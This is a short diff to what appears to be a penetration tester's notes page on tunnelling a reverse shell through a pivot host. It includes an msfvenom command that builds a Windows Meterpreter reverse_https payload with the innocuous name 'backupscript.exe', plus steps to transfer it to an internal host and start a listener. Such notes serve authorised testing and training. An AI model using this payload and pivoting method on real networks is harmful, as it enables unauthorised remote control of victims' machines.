@@ -1,3 +1,4 @@
+kill
 -- -
 Presented as a way to get a reverse shell from an internal host to your attack host that is not connected to the internal network directly. You will be tunneling the reverse shell through a pivot host you control. 
 ### Steps
@@ -9,7 +10,7 @@ Presented as a way to get a reverse shell from an internal host to your attack h
 ### Execution
 1. Create the payload on attack box:
 ```bash 
-msfvenom -p windows/x64/meterpreter/reverse_https lhost=<attackbox ip> lport=8080 -f exe -o backupscript.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=<pivotbox internal ip> lport=8080 -f exe -o backupscript.exe
 ```
 2. [[Dark Arts/File Transfer/~Home|File Transfer]] payload to pivot box, and then to the target internal host.
 3. Setup attack box listener
